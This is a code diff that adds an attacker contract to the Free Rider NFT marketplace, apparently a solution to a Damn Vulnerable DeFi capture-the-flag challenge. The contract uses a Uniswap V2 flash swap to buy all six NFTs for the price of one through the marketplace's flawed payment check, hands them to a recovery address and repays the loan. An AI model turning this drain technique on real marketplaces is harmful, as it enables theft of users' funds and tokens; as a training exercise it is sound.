@@ -5,6 +5,10 @@ pragma solidity =0.8.25;
 import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import {DamnValuableNFT} from "../DamnValuableNFT.sol";
+import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import {WETH} from "solmate/tokens/WETH.sol";
+import {console} from "forge-std/console.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract FreeRiderNFTMarketplace is ReentrancyGuard {
     using Address for address payable;
@@ -111,4 +115,60 @@ contract FreeRiderNFTMarketplace is ReentrancyGuard {
     }
 
     receive() external payable {}
+}
+
+contract AttackerContract is IERC721Receiver {
+    DamnValuableNFT public nft;
+    FreeRiderNFTMarketplace public marketplace;
+    IUniswapV2Pair public uniswapPair;
+    WETH public weth;
+    address public recoverAddress;
+    address public player;
+    uint256[] public tokens = [0, 1, 2, 3, 4, 5];
+
+    constructor(
+        DamnValuableNFT _nft,
+        FreeRiderNFTMarketplace _marketplace,
+        IUniswapV2Pair _uniswapPair,
+        WETH _weth,
+        address _recoverAddress
+    ) {
+        nft = _nft;
+        marketplace = _marketplace;
+        uniswapPair = _uniswapPair;
+        weth = _weth;
+        recoverAddress = _recoverAddress;
+        player = msg.sender;
+    }
+
+    function attack() external {
+        uniswapPair.swap(15 ether, 0, address(this), "1");
+    }
+
+    // callback method after uniswap v2 interaction
+    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
+        // console.log(weth.balanceOf(address(this)));
+        weth.withdraw(weth.balanceOf(address(this)));
+
+        marketplace.buyMany{value: 15 ether}(tokens);
+
+        bytes memory data = abi.encode(player);
+        for (uint256 i = 0; i < tokens.length; ++i) {
+            nft.safeTransferFrom(address(this), recoverAddress, tokens[i], data);
+        }
+
+        // Pay this back to the flashloan (amount + fees)
+        uint256 amountToRepay = 15 ether * 1004 / 1000;
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(uniswapPair), amountToRepay);
+    }
+
+    receive() external payable {
+        // console.log("Received ETH: ", msg.value);
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external override returns (bytes4) {
+        // console.log("Received NFT with tokenId: ", _tokenId);
+        return IERC721Receiver.onERC721Received.selector;
+    }
 }
